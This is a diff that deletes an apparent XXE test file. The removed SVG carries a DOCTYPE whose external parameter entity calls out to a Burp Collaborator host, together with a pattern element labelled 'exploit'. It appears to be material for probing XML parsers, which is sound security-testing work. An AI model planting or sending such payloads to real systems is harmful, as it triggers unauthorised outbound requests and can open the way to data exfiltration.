@@ -1,14 +1,1 @@
-<!DOCTYPE svg [
-<!ENTITY % outside SYSTEM "http://ub914cg04tbtoxcdy327r9l0argr4g.burpcollaborator.net">
-%outside;
-]>
 
-<svg>
-<defs>
-<pattern id="exploit">
-  <text x="10" y="10">
-    abc
-  </text>
-</pattern>
-</defs>
-</svg>
